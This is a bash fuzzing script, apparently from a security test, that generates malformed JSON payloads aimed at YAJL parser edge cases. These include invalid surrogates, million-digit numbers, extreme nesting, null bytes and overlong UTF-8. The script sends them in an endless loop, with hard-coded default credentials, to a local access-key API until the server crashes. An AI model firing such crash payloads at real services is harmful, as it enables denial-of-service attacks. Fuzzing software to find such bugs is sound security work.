#!/bin/bash
# Final assault - combine all techniques and target known YAJL edge cases

echo "Final assault fuzzing - combining all techniques..."

# Create payloads targeting specific YAJL vulnerabilities

# 1. Invalid surrogate pairs repeated
cat > final1.json << 'EOF'
{"path":"/test","data":"\uD800\uD800\uD800\uD800\uD800\uD800\uD800\uD800\uD800\uD800"}
EOF

# 2. Extreme exponent
python3 -c "print('{\"path\":\"/test\",\"num\":1e' + '9' * 100000 + '}')" > final2.json

# 3. Mixed incomplete structures
cat > final3.json << 'EOF'
{"path":"/test","a":[{"b":{"c":[1,2,{"d":"e","f":
EOF

# 4. Null bytes in various positions
printf '{"path":"/test\x00","data":"\x00\x00\x00"}' > final4.json
printf '{"pa\x00th":"/test","data":"value"}' > final5.json
printf '{"\x00":"/test"}' > final6.json

# 5. Very long number
python3 -c "print('{\"path\":\"/test\",\"num\":' + '9' * 1000000 + '}')" > final7.json

# 6. Negative zero and special floats
cat > final8.json << 'EOF'
{"path":"/test","nums":[-0,-0.0,0.0,-0e0,0e0,-0.0e0,0.0e0]}
EOF

# 7. Escaped null bytes
cat > final9.json << 'EOF'
{"path":"/test","data":"\\u0000\\u0000\\u0000\\u0000\\u0000"}
EOF

# 8. Mixed valid/invalid escapes
cat > final10.json << 'EOF'
{"path":"/test","data":"\\n\\r\\t\\b\\f\\/\\\"\\\\\\u0041\\uXXXX\\u"}
EOF

# 9. Deeply nested with incomplete end
python3 << 'PYTHON'
payload = '{"path":"/test","data":'
payload += '{"a":' * 10000
payload += '"value"'
# Intentionally missing closing braces
with open('final11.json', 'w') as f:
    f.write(payload)
PYTHON

# 10. Array with mixed types and malformed elements
cat > final12.json << 'EOF'
{"path":"/test","arr":[1,"two",3.0,true,false,null,{"nested":"obj"},[1,2,3],
EOF

# 11. String with all control characters
python3 << 'PYTHON'
import struct
payload = '{"path":"/test","ctrl":"'
for i in range(32):
    payload += f'\\u{i:04x}'
payload += '"}'
with open('final13.json', 'w') as f:
    f.write(payload)
PYTHON

# 12. Maximum nesting with alternating types
python3 << 'PYTHON'
payload = '{"path":"/test","data":'
for i in range(5000):
    if i % 2 == 0:
        payload += '{"k' + str(i) + '":'
    else:
        payload += '["elem' + str(i) + '",'
payload += '"end"'
payload += ']' * 2500 + '}' * 2500
with open('final14.json', 'w') as f:
    f.write(payload)
PYTHON

# 13. UTF-8 boundary cases
printf '{"path":"/test","utf8":"\xC0\x80\xE0\x80\x80\xF0\x80\x80\x80"}' > final15.json

# 14. Overlong UTF-8 sequences
printf '{"path":"/test","data":"\xC0\xAF\xE0\x80\xAF\xF0\x80\x80\xAF"}' > final16.json

# 15. Incomplete UTF-8 sequences
printf '{"path":"/test","data":"\xC2\xE0\xA0\xF0\x90\x80"}' > final17.json

echo "Created final assault payloads. Starting continuous fuzzing..."

# Continuous fuzzing loop
iteration=0
while true; do
    iteration=$((iteration + 1))
    echo "=========================================="
    echo "ITERATION $iteration"
    echo "=========================================="
    
    # Test all final payloads
    for file in final*.json; do
        if [ ! -f "$file" ]; then
            continue
        fi
        
        echo "[$iteration] Testing: $file"
        
        # Try multiple times with slight variations
        for attempt in {1..3}; do
            timeout 5 curl -sS -u access_key1:aspera http://localhost:9091/access_keys \
                -H "Content-Type: application/json" \
                --data-binary "@$file" \
                -w "\nHTTP:%{http_code}\n" 2>&1 | head -10
            
            result=$?
            if [ $result -eq 124 ]; then
                echo "!!! TIMEOUT on $file (attempt $attempt) !!!"
            elif [ $result -ne 0 ]; then
                echo "!!! CURL FAILED on $file (attempt $attempt) - checking server !!!"
                sleep 1
                timeout 3 curl -sS http://localhost:9091/ 2>&1 > /dev/null
                if [ $? -ne 0 ]; then
                    echo "!!! SERVER APPEARS TO BE DOWN !!!"
                    echo "Last successful payload: $file"
                    exit 1
                fi
            fi
        done
        
        sleep 0.05
    done
    
    # Also test with existing malformed payloads
    for file in n_structure_100000*.json n_deeply_nested*.json n_extreme*.json; do
        if [ ! -f "$file" ]; then
            continue
        fi
        
        echo "[$iteration] Re-testing: $file"
        timeout 5 curl -sS -u access_key1:aspera http://localhost:9091/access_keys \
            -H "Content-Type: application/json" \
            --data-binary "@$file" 2>&1 | head -5
        
        if [ $? -ne 0 ]; then
            echo "!!! Issue with $file - checking server !!!"
            timeout 3 curl -sS http://localhost:9091/ 2>&1 > /dev/null
            if [ $? -ne 0 ]; then
                echo "!!! SERVER DOWN after $file !!!"
                exit 1
            fi
        fi
    done
    
    # Health check every iteration
    echo "Health check iteration $iteration..."
    timeout 3 curl -sS -u access_key1:aspera http://localhost:9091/access_keys \
        -H "Content-Type: application/json" \
        --data-binary '{"path":"/test"}' 2>&1 | head -3
    
    if [ $? -ne 0 ]; then
        echo "!!! SERVER NOT RESPONDING after iteration $iteration !!!"
        exit 1
    fi
    
    echo "Iteration $iteration complete. Server still alive."
    echo ""
    sleep 1
done
